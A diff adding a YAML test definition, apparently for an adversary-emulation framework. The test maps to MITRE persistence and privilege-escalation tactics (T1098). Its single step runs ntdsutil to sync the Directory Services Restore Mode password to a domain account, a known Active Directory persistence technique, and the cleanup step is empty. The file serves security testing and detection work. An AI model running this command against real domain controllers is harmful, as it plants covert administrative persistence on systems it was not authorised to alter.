@@ -1,0 +1,26 @@
+api_version: "2.0"
+name: Password Change on Directory Service Restore Mode (DSRM) Account
+description: |
+    Change the password on the Directory Service Restore Mode (DSRM) account using ntdsutil by syncing to existing account
+args:
+    - name: sync_account
+      type: string
+      default: '%username%'
+uuid: d5b886d9-d1c7-4b6e-a7b0-460041bf2823
+mitre:
+    tactics:
+        - 'TA0003: Persistence'
+        - 'TA0004: Privilege Escalation'
+    techniques:
+        - 'T1098: Account Manipulation'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: password-change-on-directory-service-restore-mode-(dsrm)-account
+      inline: |
+        ntdsutil "set dsrm password" "sync from domain account {{.Args.sync_account}}" "q" "q"
+      executor: command_prompt
+      cleanup:
+        inline: ""
+        executor: command_prompt
